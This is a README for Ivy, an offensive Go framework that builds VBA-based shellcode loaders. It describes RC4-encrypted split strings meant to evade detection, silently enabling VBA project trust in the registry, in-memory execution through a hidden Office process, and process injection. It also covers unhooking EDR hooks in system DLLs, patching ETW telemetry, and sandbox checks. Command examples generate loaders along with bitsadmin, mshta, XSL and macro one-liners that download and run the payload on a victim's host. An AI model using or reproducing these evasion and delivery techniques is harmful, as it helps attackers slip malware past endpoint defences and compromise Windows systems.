

<h1 align="center">
<br>
<img src=Screenshots/Logo.png >
<br>
</h1>

## More Information
If you want to learn more about the techniques utilized in this framework as well as the defensive measure to help defend against it, please take a look at [Article](https://www.optiv.com/insights/source-zero/blog/defeating-edrs-office-products). 
#

## Description
Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code in memory. Ivy’s loader does this by abusing programmatical access in the VBA object environment to load, decrypt, and execute shellcode. This technique is as close as possible to be truly fileless, as most fileless attacks these days require some sort of files being dropped on disk, as a result bypassing standard signature-based rules for detecting VBA code. Typical VBA payloads have the following characteristics:
- Exist in Macro enabled Office Documents
- These Macro Documents exist on disk

By running purely in memory, these behavior characteristics makes it harder to be detected by EDRs.

Ivy’s loaders are encrypted using RC4 encryption (AES encryption causes a lot of bloat and takes forever for VBA to decrypt) and then broken into separate strings, preventing any sandboxing from recognizing these strings as encrypted strings that should be investigated. This also prevents any decoding mechanism from recognizing these payloads as anything but garbage characters. 

Ivy’s loader first performs a registry query to enable “Trust access to the VBA project object mode”. This registry key value is stored in user-mode which allows the user to modify the value without requiring any elevated permissions. The registry value is set from a zero to 1; if the registry key does not exist Ivy will create it with a value of “1”.  With this value enabled, programmatical access is allowed to the VBA object environment from a different process.   

<p align="center"> <img src=Screenshots/Trusted-Access.png border="2px solid #555">


Once this is done the loader will then spawn a hidden Excel process and load the encrypted strings into a VBA function. This is done by using ActiveX to simulate the GUI actions of doing the same task. This helps bypass a lot of traditional controls in place to monitor for execution. As a result, the decrypt function and shellcode are moved from one memory buffer to another, never touching disk. Finally, the loader uses command-GUI calls and executes the run function, which simulates the act of clicking on the run macro button in the GUI panel of VBA, beginning the decryption function, followed by the actual execution of the shellcode.

<b>IMPORTANT</b>

The target endpoint must have Microsoft Office installed and activated in order to run because Ivy relies on a abusing the programticatical access to the VBA environment of Microsoft office. 

## EDR Unhook Mode

This allows Ivy to use low-level system calls to build its own version of the Windows function WriteProcessMemory by referencing the direct memory address and register values indirectly. Ivy can overwrite sections of memory that are not writable without calling any of the memory change API functions. This is done because of a feature of WriteProcessMemory which temporarily changes the permissions of the region of memory to writeable (if you have sufficient privileges, which we do since we own the process). It writes the value and restores the original permissions without calling the VirtualProtect function, instead it automatically calls the associated syscall (NtProtectVirtualMemory). 

Ivy does not utilize its own version of NtWriteVirtualMemory because this process of temporarily changing the memory permissions would not occur, meaning the protection of the specific memory address would not be modified and the execution would fail. This is a “feature” Microsoft has released to make debuggers more stable. As debuggers want to modify memory on the fly, they can simply modify a section without having to perform multiple tasks. (See devblogs.microsoft.com for information)

Let’s take a look at the series of events that an EDR would see:
* Ivy creates WriteProcessMemory function that sets up the proper registry values manually.
* Our function calls the exact memory address where WriteProcessMemory is stored. (This would look like a call to the register RAX rather than calling kernel32.WriteProcessMemory)
* This means we’re not directly calling WriteProcessMemory while still utilizing all the features.
* EDR would only see a string of assembly that does not match any malicious indicators to a memory address.
* This memory address would be the start of a function, but the function address is unique because of ASLR; a lookup of every function would need be performed.
* Prior to the Write action being performed, the syscall ZWQueryVirtualMemory is executed to view the protections on the region of memory.
* If this memory is not set to writeable, NtProtectVirtualMemory is called to change the permissions.
* Then 8 bytes of assembly are written to the specific memory address.
* NtProtectVirtualMemory is called once more to restore the original protection value. 

Once all the EDR hooks have been flushed out it, the loader then performs its normal action to establish a remote session.

<p align="center"> <img src=Screenshots/EDR-Hooked.png border="2px solid #555">

<p align="center"> <img src=Screenshots/EDR-Unhooked.png border="2px solid #555">

Ivy address this by unhooking common system DLLs EDR's hook, this includes:
* Ntdll.dll
* Kernel32.dll
* Kernelbase.dll
* Advapi32.dll
* Sechost.dll
* Ws2_32.dll
* Winmmbase.dll


When using `unhook` with a payload type `Inject` Ivy's loader will first unhook the office process removing the edr from it and then remove the hooks in the injected processs. These ensures that both processes are hook free, preventing any telemetry from the parent and child process from being sent to the EDR.

## ETW Patching

Using the same technique to unhook, Ivy can patch ETW functions, preventing any event from being generated by the process. ETW utilizes built-in Syscalls to generate this telemetry. Since ETW is a native feature built into Windows, security products do not need to "hook" the ETW syscalls to gain the information. As a result, to prevent ETW, Ivy patches numerous ETW syscalls, flushing out the registers and returning the execution flow to the next instruction. Patching ETW is now default in all loaders, if you wish to not patch ETW use the `-noetw` command-line option to disable it in your loader.


<p align="center"> <img src=Screenshots/ETW-Patch.png border="2px solid #555">

## Demo
<p align="center"><img src="https://media.giphy.com/media/c4uvKoKtigQIK7Jbty/giphy.gif"/>



## Installation


Ivy was developed with go.


The first step as always is to clone the repo. Before you compile Ivy, you'll need to install the dependencies. 
To install them, run following commands:
```
go get github.com/fatih/color
go get github.com/KyleBanks/XOREncryption/Go
```
Then build it

```
go build Ivy.go
```

## Help

```
$ ./Ivy -h

     ___   ___      ___  ___    ___
    |\  \ |\  \    /  /||\  \  /  /|
    \ \  \\ \  \  /  / /\ \  \/  / /
     \ \  \\ \  \/  / /  \ \    / /
      \ \  \\ \    / /    \/  /  /
       \ \__\\ \__/ /   __/  / /
        \|__| \|__|/   |\___/ /
                       \|___|/
                       (@Tyl0us)
The suffering. The pain. Can't you hear them?
Their cries for mercy?

Usage of ./Ivy:
    -Ix64 string
    	Path to the x64 payload
  -Ix86 string
    	Path to the x86 payload
  -O string
    	Name of output file
  -P string
    	Payload type "Inject" (Which performs a process injection) or "Local" (Which loads the payload directly into the current process)
  -debug
    	Print debug statements
  -delivery string
    	Generates an one-liner command to download and execute the payload remotely:
    	[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader.
    	[*] hta - Generates a blank hta file containing the loader along with a one liner command execute the loader remotely.
    	[*] macro - Generates an office macro that would download and execute a the loader remotely.
    	[*] xsl - Generates a xsl stylesheet file containing the loader along with a one liner command execute the loader remotely.
  -process32 string
    	The full path to the x86 application to spawn. Only use applications that are found in System32 & SYSWOW64 (default is rundll32.exe)
  -process64 string
    	The full path to the x64 application to spawn. Please  specify the path to the process to create/inject into (use \ for the path) (default is explorer.exe)
  -product string
    	Name of the office product to use (Excel, Word, PowerPoint) (default "Excel")
  -sandbox
    	Enable sandbox evasion controls (i.e. checks if the system is domain joined)
  -stageless
    	Enables stageless payload. When this option is enabled use a raw payload (aka .bin files) instead of .c code
  -unhook
    	Unhooks EDR's hooks before loading payload
  -url string
    	URL assoicated with the Delivery option to retrieve the payload. (e.g https://acme.com/)
```
## Generating a Loader

When generating a loader with Ivy, you need to generate a 64 and 32-bit payload and input them in with ```-Ix64``` and ```-Ix86``` command line arguments. This is because the operating system may be 64-bit but the version of Office running maybe actually be 32-bit; as a result Ivy will detect the suitable architecture to use before injecting the payload.

In addition, when generating a loader there are two payload types. The first, `Inject`, performs a process injection attack where a new process is spawned in a suspended state and the shellcode is injected into the process, before resuming it. While process injection can be handy and generates a non-excel process, EDRs are very adept at detecting the act of creating a suspended process to inject into, which can get us caught. The stealthier option is `Local`. This loads the shellcode directly into the current Office process. The `Local` option also comes with additional features to avoid detection, utilizing direct calls to some Windows syscalls. This is due to the VBA environment allowing us to define and call the exact function (provided we have aligned all the correct registers beforehand) based on the stack.  Finally, Ivy’s loader in this payload type has an undocumented call to execute shellcode, making it harder to catch execution.

### Injection Process

With `Inject` mode Ivy will create a process in a suspended state to injection shellcode into. Depending on the on weither its a 32-bit or 64-bit system it will spawn a different process. Ivy comes with some default process names to spawn, however these can be chagned by using the `process32` or `process64` flags. When specifying the path ensure you use `\\` for the path.

# Staged vs Stageless Shellcode

First of all, YOU SHOULD ALWAYS USE the ```-stageless``` argument. However, if you ever need to run a staged payload you can do so by not using the `-stageless` argument. When using the `-stageless` you can use raw shellcode, however, when you choose to run a staged payload it is important that for `Inject` payload types the shellcode must be VBA formatted and for `Local` types the shellcode be C formatted.


# Delivery 
The delivery command line argument allows you to generate a command or string of code (in the macro case) to remotely pull the file from a remote source to the victim’s host. These delivery methods include:
* Bits – This will generate a bitsadmin command that will download the loader remotely, execute and remove it.
* HTA – This will generate a blank HTA file containing the loader. This option will also provide a command line that will execute the HTA remotely in the background.
* Macro – This will generate an Office macro that can be put into an Excel or Word macro document. When this macro is executed, the loader will be downloaded from a remote source and executed, then removed. 
* XSL - Generates a xsl stylesheet file containing the loader along with a one liner command execute the loader remotely.

# Examples 

### Staged Inject payload


```
./Ivy -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
```

### Staged Local payload
```
./Ivy -Ix64 test64.c -Ix86 test32.c -P Local -O SampleLocal.js
```

### Stagless Local payload
```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O stageless.js
```

### Stagless Injected payload
```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O stageless.js
```

### Stagless Injected payload spawning notepad.exe
```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -process64 C:\\windows\\system32\\notepad.exe -process32 C:\\windows\\SysWOW64\\notepad.exe -O stageless.js
```

### Unhooked Stagless Local payload 
```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -unhook -O stageless.js
```

### Unhooked Stagless Injected payload
```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -unhook -O stageless.js
```

## One Liner Commands Samples

### Non-Executable File Types

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O test.png -stageless
```

### Bitsadmin Command

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.js -url http://ACME.com -delivery bits -stageless
```

### MSHTA.exe Command

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.hta -url http://ACME.com -delivery hta -stageless
```


### Stylesheet Payload
```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.xsl -url http://ACME.com -delivery xsl -stageless
```


### Macro Web Downloader

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.txt -url http://ACME.com/test.txt -delivery macro -stageless
```

# Known Issues
Currently there is a known issue with unhooking the remote injected process. A current work around is to load the [unhook](https://github.com/rsmudge/unhook-bof) BOF, for now.
